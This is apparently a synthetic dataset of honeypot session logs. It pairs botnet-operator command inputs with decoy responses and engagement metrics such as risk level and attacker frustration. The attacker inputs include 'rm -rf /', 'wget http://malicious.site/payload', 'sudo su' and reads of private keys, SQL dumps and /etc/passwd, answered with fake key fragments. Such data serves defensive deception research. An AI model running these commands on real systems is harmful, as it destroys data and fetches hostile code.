session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
3,2,botnet_operator,2025-05-24 23:42:12.604972,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,163,initial_recon,5.3573096531428845,0.1,2.099999999999998,initial_recon,1,0,0,0,-8958916735605131775,308.70499685368856,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:17.962282,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,164,initial_recon,6.490864496288048,0.1,1.9999999999999976,initial_recon,1,1,0,1,-8958916735605131775,315.1958613499766,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:24.453146,sudo su,Command executed,privilege_escalation,5,False,True,1,165,initial_recon,1.011478063361818,0.1,1.8999999999999977,initial_recon,1,0,1,1,-8958916735605131775,316.20733941333845,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:25.464624,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,166,initial_recon,1.1233950807994355,0.1,2.099999999999998,initial_recon,1,0,0,0,-8958916735605131775,317.33073449413786,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:26.588019,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,167,initial_recon,22.46834393569481,0.1,1.9999999999999976,initial_recon,1,1,0,1,-8958916735605131775,339.79907842983266,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:49.056363,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,168,initial_recon,8.988033208277196,0.1,1.8999999999999977,initial_recon,1,1,0,1,-8958916735605131775,348.7871116381099,20.622826118226087
3,2,botnet_operator,2025-05-24 23:42:58.044397,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,169,initial_recon,4.790417880458406,0.1,1.7999999999999976,initial_recon,1,0,0,1,-8958916735605131775,353.57752951856827,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:02.834815,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,170,initial_recon,33.91114733797289,0.1,1.9999999999999976,initial_recon,1,0,0,0,-8958916735605131775,387.48867685654113,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:36.745962,rm -rf /,Command executed,destruction,5,True,True,1,171,initial_recon,1.6791243559212057,0.1,2.199999999999997,initial_recon,1,0,0,1,-8958916735605131775,389.1678012124624,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:38.425086,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,172,initial_recon,0.2710697059330957,0.1,2.099999999999997,initial_recon,1,0,0,0,-8958916735605131775,389.4388709183955,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:38.696156,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,173,initial_recon,14.234859604566164,0.1,2.2999999999999976,initial_recon,1,1,0,0,-8958916735605131775,403.6737305229617,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:52.931016,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,174,initial_recon,5.015545528838249,0.1,2.199999999999997,initial_recon,1,0,0,0,-8958916735605131775,408.6892760517999,20.622826118226087
3,2,botnet_operator,2025-05-24 23:43:57.946561,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,1,175,initial_recon,31.869102844192447,0.1,2.3999999999999977,initial_recon,1,1,0,1,-8958916735605131775,440.5583788959923,20.622826118226087
3,2,botnet_operator,2025-05-24 23:44:29.815664,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,176,initial_recon,6.165791314508939,0.1,2.2999999999999976,initial_recon,1,0,0,0,-8958916735605131775,446.72417021050126,20.622826118226087
3,2,botnet_operator,2025-05-24 23:44:35.981455,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,177,initial_recon,4.917875030750356,0.1,2.199999999999997,initial_recon,1,1,0,0,-8958916735605131775,451.6420452412516,20.622826118226087
3,2,botnet_operator,2025-05-24 23:44:40.899330,rm -rf /,Command executed,destruction,5,False,True,1,178,initial_recon,3.9124275144544263,0.1,2.099999999999997,initial_recon,1,0,0,1,-8958916735605131775,455.55447275570606,20.622826118226087
3,2,botnet_operator,2025-05-24 23:44:44.811758,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,179,initial_recon,17.157374831489182,0.1,2.2999999999999976,initial_recon,1,1,0,0,-8958916735605131775,472.7118475871952,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:01.969133,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,180,initial_recon,6.824055951336478,0.1,2.199999999999997,initial_recon,1,0,0,0,-8958916735605131775,479.5359035385317,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:08.793189,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,181,initial_recon,8.067504557203442,0.1,2.099999999999997,initial_recon,1,0,0,0,-8958916735605131775,487.6034080957351,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:16.860693,rm -rf /,Command executed,destruction,5,True,True,0,182,initial_recon,1.9109590947974449,0.1,2.2999999999999976,initial_recon,1,0,0,1,-8958916735605131775,489.5143671905326,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:18.771652,rm -rf /,Command executed,destruction,5,True,True,0,183,initial_recon,12.75674107814496,0.1,2.199999999999997,initial_recon,1,0,0,1,-8958916735605131775,502.2711082686776,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:31.528393,sudo su,Command executed,privilege_escalation,5,False,True,1,184,initial_recon,13.00343659899028,0.1,2.099999999999997,initial_recon,1,0,1,1,-8958916735605131775,515.2745448676678,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:44.531830,sudo su,Permission denied,privilege_escalation,5,False,True,2,185,initial_recon,3.360412665967319,0.1,2.2999999999999976,initial_recon,1,0,1,1,-8958916735605131775,518.6349575336351,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:47.892243,sudo su,Command executed,privilege_escalation,5,True,True,1,186,initial_recon,4.0895972605911854,0.1,2.699999999999998,initial_recon,1,0,1,1,-8958916735605131775,522.7245547942264,20.622826118226087
3,2,botnet_operator,2025-05-24 23:45:51.981840,rm -rf /,Command executed,destruction,5,False,True,2,187,initial_recon,8.399924775318196,0.1,2.599999999999998,initial_recon,1,0,0,1,-8958916735605131775,531.1244795695445,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:00.381765,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,1,188,initial_recon,1.9206867940787304,0.1,2.799999999999998,initial_recon,1,1,0,1,-8958916735605131775,533.0451663636233,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:02.302451,rm -rf /,Command executed,destruction,5,True,True,0,189,initial_recon,2.30190388676448,0.1,2.699999999999998,initial_recon,1,0,0,1,-8958916735605131775,535.3470702503878,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:04.604355,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,190,initial_recon,5.751053164767466,0.1,2.599999999999998,initial_recon,1,0,0,0,-8958916735605131775,541.0981234151552,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:10.355408,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,191,initial_recon,4.933742883790802,0.1,2.499999999999998,initial_recon,1,1,0,0,-8958916735605131775,546.031866298946,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:15.289151,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,192,initial_recon,9.217162336736662,0.1,2.3999999999999977,initial_recon,1,1,0,0,-8958916735605131775,555.2490286356826,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:24.506314,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,193,initial_recon,0.3018206880968131,0.1,2.2999999999999976,initial_recon,1,0,0,0,-8958916735605131775,555.5508493237795,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:24.808134,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,194,initial_recon,5.338180044740026,0.1,2.199999999999997,initial_recon,1,0,0,0,-8958916735605131775,560.8890293685195,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:30.146314,rm -rf /,Command executed,destruction,5,False,True,2,195,initial_recon,6.6660229624125,0.1,2.3999999999999977,initial_recon,1,0,0,1,-8958916735605131775,567.555052330932,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:36.812337,rm -rf /,Command executed,destruction,5,False,True,3,196,initial_recon,0.9718999369183337,0.1,2.599999999999998,initial_recon,1,0,0,1,-8958916735605131775,568.5269522678503,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:37.784237,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,2,197,initial_recon,6.386630402497111,0.1,2.799999999999998,initial_recon,1,1,0,0,-8958916735605131775,574.9135826703474,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:44.170868,rm -rf /,Command executed,destruction,5,False,True,3,198,initial_recon,1.0629221111451217,0.1,2.699999999999998,initial_recon,1,0,0,1,-8958916735605131775,575.9765047814926,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:45.233790,sudo su,"
Authentication required. Please enter credentials:",privilege_escalation,5,False,True,4,199,initial_recon,4.392706277744443,0.1,2.899999999999998,initial_recon,1,0,1,1,-8958916735605131775,580.369211059237,20.622826118226087
3,2,botnet_operator,2025-05-24 23:46:49.626496,sudo su,Permission denied,privilege_escalation,5,False,True,5,200,initial_recon,1.510301050629116,0.1,3.0999999999999983,initial_recon,1,0,1,1,-8958916735605131775,581.8795121098661,20.622826118226087
4,3,botnet_operator,2025-05-24 23:37:09.299391,find / -name '*.key',Command not found,data_exfiltration,3,False,False,1,1,initial_recon,3.355804307819909,0.1,0.0,initial_recon,0,0,0,0,-8958916735605131775,3.355804307819909,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:12.655195,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,2,initial_recon,0.3032640798678815,0.1,0.2,initial_recon,0,0,0,0,-8958916735605131775,3.659068387687791,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:12.958459,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,3,initial_recon,2.312133381527877,0.2284339179151809,0.1,initial_recon,1,1,0,1,-8958916735605131775,5.971201769215668,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:15.270593,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,4,initial_recon,1.415575745630328,0.3905919715539346,0.0,initial_recon,1,1,0,1,-8958916735605131775,7.386777514845996,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:16.686169,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,5,initial_recon,3.165930277064258,0.5760398823273374,0.0,initial_recon,1,1,0,1,-8958916735605131775,10.552707791910256,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:19.852099,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,6,initial_recon,0.1,0.5086435215417703,0.0,initial_recon,1,0,0,0,-8958916735605131775,10.652707791910254,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:19.952099,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,7,initial_recon,1.7737182029492309,0.3635567364925534,0.0,initial_recon,1,1,0,0,-8958916735605131775,12.426425994859486,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:21.725817,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,8,initial_recon,0.5046712342320893,0.2818464237250239,0.0,initial_recon,1,0,0,0,-8958916735605131775,12.931097229091575,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:22.230488,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,9,initial_recon,0.107169004607819,0.2173672528988151,0.0,initial_recon,1,1,0,1,-8958916735605131775,13.038266233699394,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:22.337657,sudo su,Command executed,privilege_escalation,5,False,False,1,10,initial_recon,0.4098796539204301,0.1747029885105623,0.0,initial_recon,1,0,1,1,-8958916735605131775,13.448145887619823,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:22.747537,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,2,11,initial_recon,0.1728984794898468,0.1477908032492975,0.2,initial_recon,1,0,0,1,-8958916735605131775,13.62104436710967,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:22.920435,sudo su,Command executed,privilege_escalation,5,False,False,3,12,initial_recon,0.9492077775220904,0.1303233246163937,0.4,initial_recon,1,0,1,1,-8958916735605131775,14.57025214463176,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:23.869643,find / -name '*.key',Command not found,data_exfiltration,3,False,False,4,13,initial_recon,2.6123417869048104,0.1195873131314818,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,17.182593931536573,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:26.481985,sudo su,Command executed,privilege_escalation,5,False,False,5,14,initial_recon,2.951755913864411,0.1135455194967139,0.8,initial_recon,1,0,1,1,-8958916735605131775,20.134349845400983,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:29.433741,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,4,15,initial_recon,3.801422105763943,0.1094125837714315,1.0,initial_recon,1,0,0,0,-8958916735605131775,23.935771951164924,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:33.235163,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,3,16,initial_recon,3.033698853484184,0.1068191688529378,0.9,initial_recon,1,1,0,1,-8958916735605131775,26.96947080464911,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:36.268862,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,2,17,initial_recon,0.711211278782065,0.1045947307533088,0.8,initial_recon,1,1,0,0,-8958916735605131775,27.68068208343117,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:36.980073,sudo su,Command executed,privilege_escalation,5,False,False,3,18,initial_recon,3.166005097485128,0.1028739526102811,0.7000000000000001,initial_recon,1,0,1,1,-8958916735605131775,30.8466871809163,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:40.146078,find / -name '*.key',Command not found,data_exfiltration,3,False,False,4,19,initial_recon,6.056744111932455,0.1019234256197427,0.9000000000000001,initial_recon,1,0,0,0,-8958916735605131775,36.90343129284876,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:46.202822,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,5,20,initial_recon,4.936141011484778,0.1016306283296223,1.1,initial_recon,1,0,0,1,-8958916735605131775,41.83957230433354,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:51.138963,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,6,21,initial_recon,1.8588526829137044,0.1011497371630469,1.3,initial_recon,1,0,0,1,-8958916735605131775,43.69842498724724,6.462633685598746
4,3,botnet_operator,2025-05-24 23:37:52.997816,sudo su,Command executed,privilege_escalation,5,False,False,7,22,initial_recon,7.129597362440797,0.1007182762475951,1.5,initial_recon,1,0,1,1,-8958916735605131775,50.828022349688034,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:00.127413,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,8,23,initial_recon,9.029754453506976,0.1006126896156993,1.7,initial_recon,1,0,0,1,-8958916735605131775,59.85777680319501,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:09.157168,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,7,24,initial_recon,0.1595498250893811,0.1006492799338821,1.9,initial_recon,1,0,0,0,-8958916735605131775,60.0173266282844,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:09.316718,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,6,25,initial_recon,2.907418450524141,0.1003958045209703,1.7999999999999998,initial_recon,1,1,0,0,-8958916735605131775,62.924745078808535,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:12.224136,sudo su,Command executed,privilege_escalation,5,False,False,7,26,initial_recon,3.234125327756052,0.1002448514335229,1.6999999999999995,initial_recon,1,0,1,1,-8958916735605131775,66.15887040656459,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:15.458261,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,6,27,initial_recon,1.5819039078361763,0.1001519263460988,1.9,initial_recon,1,0,0,0,-8958916735605131775,67.74077431440077,6.462633685598746
4,3,botnet_operator,2025-05-24 23:38:17.040165,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,5,28,initial_recon,6.050192996174142,0.1000930550799324,1.7999999999999996,initial_recon,1,0,0,0,-8958916735605131775,73.7909673105749,6.462633685598746
